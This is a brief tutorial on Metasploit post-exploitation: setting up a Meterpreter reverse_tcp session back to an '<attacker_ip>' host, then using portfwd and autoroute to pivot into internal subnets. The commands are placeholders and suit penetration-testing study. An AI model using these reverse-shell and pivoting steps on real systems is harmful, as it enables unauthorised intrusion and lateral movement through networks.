Metasploit provides built-in tools to establish port forwarding through compromised machines.

## Steps to Forward Ports with Metasploit

#### Set Up a Meterpreter Session

After compromising a target, establish a Meterpreter session:
```bash
msfconsole
use exploit/<exploit_name>
set RHOST <target_ip>
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <attacker_ip>
set LPORT <port>
exploit
```

#### Add Port Forwarding Rules

Once in the Meterpreter session, you can set up port forwarding using the `portfwd` command.

| Option | Description                                                     |
| ------ | --------------------------------------------------------------- |
| `-l`   | The port on your attacking machine (local port).                |
| `-p`   | The port on the target system you want to access (remote port). |
| `-r`   | The target IP or internal host behind the compromised machine.  |

```bash
portfwd add -l <local_port> -p <target_port> -r <target_ip>
```

## Pivoting with Port Forwarding

Port forwarding can also be used for pivoting into deeper parts of the network.

#### Add Routes to Access Other Subnets

1. Use the `autoroute` command to add a route to another subnet:

```bash
run autoroute -s <subnet_ip>/<subnet_mask>
```

2. Forward ports to services in the pivoted network:
```bash
portfwd add -l <local_port> -p <target_port> -r <target_ip>
```